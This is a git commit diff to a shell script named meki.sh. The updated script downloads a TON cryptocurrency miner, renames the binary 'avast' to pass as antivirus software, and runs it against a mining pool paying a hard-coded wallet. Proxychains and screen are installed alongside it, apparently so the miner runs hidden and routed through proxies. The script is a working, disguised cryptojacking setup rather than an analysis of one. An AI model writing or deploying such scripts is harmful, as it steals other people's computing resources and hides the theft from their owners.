6876babdaf19dcfb2c5f1e07e5ee64a5bb3b744f
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 03:28:19 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -4,10 +4,12 @@ apt install proxychains
 
 apt install screen -y
 
-wget -q https://raw.githubusercontent.com/renilo/bc/main/avast
+wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
+
+tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
+
+mv miner-linux avast
 
 chmod +x avast 
 
-WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)
-
-./avast --algo TON --pool ton.de.hashrate.to:4003 --user EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z.$WORKER --ton-mode 6
+./avast run https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
